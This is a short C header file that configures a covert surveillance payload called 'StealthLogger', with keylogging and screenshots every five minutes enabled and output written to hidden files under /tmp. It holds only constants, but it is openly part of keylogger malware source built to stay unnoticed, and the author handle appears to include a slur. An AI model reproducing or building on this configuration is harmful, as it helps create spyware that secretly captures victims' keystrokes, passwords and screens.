#ifndef PAYLOAD_CONFIG_H
#define PAYLOAD_CONFIG_H

// Payload configuration
#define PAYLOAD_NAME "StealthLogger"
#define PAYLOAD_VERSION "1.0.0"
#define PAYLOAD_AUTHOR "FaZe0wNsJeW"

// Logging settings
#define LOG_FILE "/tmp/.system.log"
#define LOG_MAX_SIZE 1048576 // 1MB
#define LOG_FLUSH_INTERVAL 30 // seconds

// Keylogger settings
#define KEYLOG_ENABLED 1
#define KEYLOG_BUFFER_SIZE 256

// Screenshot settings
#define SCREENSHOT_ENABLED 1
#define SCREENSHOT_INTERVAL 300 // 5 minutes
#define SCREENSHOT_PATH "/tmp/.screenshots/"

#endif // PAYLOAD_CONFIG_H